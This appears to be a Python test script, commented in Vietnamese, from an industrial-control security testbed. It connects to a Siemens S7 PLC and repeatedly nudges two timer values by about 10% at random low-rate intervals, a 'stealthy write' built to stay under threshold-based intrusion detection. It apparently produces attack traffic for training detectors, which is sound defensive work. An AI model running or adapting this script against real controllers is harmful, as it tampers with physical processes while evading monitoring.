#!/usr/bin/env python3
"""
tests/test_stealthy_write.py
Stealthy Low-Rate Write: ghi nhe trong nguong hop le, sai thoi diem.
Khong burst, khong flood, khong trigger threshhold IDS.
Chi AI/context-aware moi phat hien duoc.
Thay tests/test_ews_firmware.py

Chay: python tests/test_stealthy_write.py
"""

import sys
import os
import time
import random

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from tests.common import *

WRITE_COUNT = 8
INTERVAL_MIN = 15
INTERVAL_MAX = 30


def read_timer(client, offset):
    try:
        from snap7.type import Areas
    except ImportError:
        from snap7.types import Areas
    from snap7.util import get_dint
    return get_dint(client.read_area(Areas.MK, 0, offset, 4), 0)


def write_timer(client, offset, value):
    try:
        from snap7.type import Areas
    except ImportError:
        from snap7.types import Areas
    from snap7.util import set_dint
    buf = bytearray(4)
    set_dint(buf, 0, value)
    client.write_area(Areas.MK, 0, offset, buf)


def main():
    print(f"\n{B}[TEST] STEALTHY_LOW_RATE_WRITE (Context-Aware Stealth){X}")
    info(f"PLC: {PLC_IP}  Writes: {WRITE_COUNT}  Interval: {INTERVAL_MIN}-{INTERVAL_MAX}s")
    info("Ghi gia tri TRONG NGUONG hop le, SAI THOI DIEM quy trinh")
    info("Threshold IDS bo qua -> chi AI/context-aware moi phat hien")

    changes = []
    observable = []
    notes = []
    error = None
    t0 = time.time()

    try:
        import snap7
        c = snap7.client.Client()
        c.connect(PLC_IP, RACK, SLOT)
        ok(f"S7 connected")

        before = plc_snapshot(c)

        for i in range(WRITE_COUNT):
            # Read CD1 current value (timer)
            cd1 = read_timer(c, 54)
            cd2 = read_timer(c, 58)

            if cd1 > 0 and cd1 < 30000:
                # Stealthy: chi thay doi nhe (+10%), van trong nguong binh thuong
                new_cd1 = int(cd1 * 1.10)
                if new_cd1 > 30000:
                    new_cd1 = int(cd1 * 0.90)
                write_timer(c, 54, new_cd1)
                ok(f"  #{i+1}: CD1 {cd1} -> {new_cd1} (+{new_cd1-cd1}, delta={100*(new_cd1-cd1)//max(1,cd1)}%)")
                observable.append(f"Stealthy write CD1: {cd1}->{new_cd1}ms")
            elif cd2 > 0 and cd2 < 30000:
                new_cd2 = int(cd2 * 1.10)
                if new_cd2 > 30000:
                    new_cd2 = int(cd2 * 0.90)
                write_timer(c, 58, new_cd2)
                ok(f"  #{i+1}: CD2 {cd2} -> {new_cd2}")
                observable.append(f"Stealthy write CD2: {cd2}->{new_cd2}ms")
            else:
                info(f"  #{i+1}: khong co timer dang chay — skip")
                observable.append(f"No active timer — stealthy skip")

            wait = random.uniform(INTERVAL_MIN, INTERVAL_MAX)
            info(f"       waiting {wait:.0f}s...")
            time.sleep(wait)

        after = plc_snapshot(c)
        changes = plc_diff(before, after)

        notes.append(f"{WRITE_COUNT} low-rate writes, interval {INTERVAL_MIN}-{INTERVAL_MAX}s")
        notes.append("Dac diem: gia tri TRONG nguong, tan suat THAP -> evades threshold IDS")
        notes.append("Chi pause tiny write: khong thay doi trang thai logic PLC")
        notes.append("CIC feature: Flow Duration cao, Fwd Packets/s thap, variance cao")

        c.disconnect()

    except Exception as e:
        error = str(e)
        fail(str(e))

    success = len(observable) > 0
    print_result("STEALTHY_LOW_RATE_WRITE", success, changes, observable, notes, time.time() - t0, error)


if __name__ == "__main__":
    main()
